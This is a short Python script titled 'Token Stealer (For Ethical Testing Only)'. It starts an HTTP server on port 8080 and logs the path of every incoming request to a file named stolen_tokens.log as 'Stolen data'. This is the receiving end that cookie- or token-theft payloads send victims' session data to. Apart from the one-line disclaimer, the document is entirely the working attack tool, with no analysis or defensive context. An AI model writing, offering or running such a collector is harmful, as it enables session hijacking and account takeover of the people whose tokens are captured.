# 🧠 Token Stealer (For Ethical Testing Only)
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging

class StealHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        logging.info("🍪 Stolen data: %s", self.path)
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"<h1>Logged</h1>")

if __name__ == '__main__':
    logging.basicConfig(filename='stolen_tokens.log', level=logging.INFO)
    print("[⚠️] Token Stealer running on 0.0.0.0:8080")
    server = HTTPServer(('0.0.0.0', 8080), StealHandler)
    server.serve_forever()
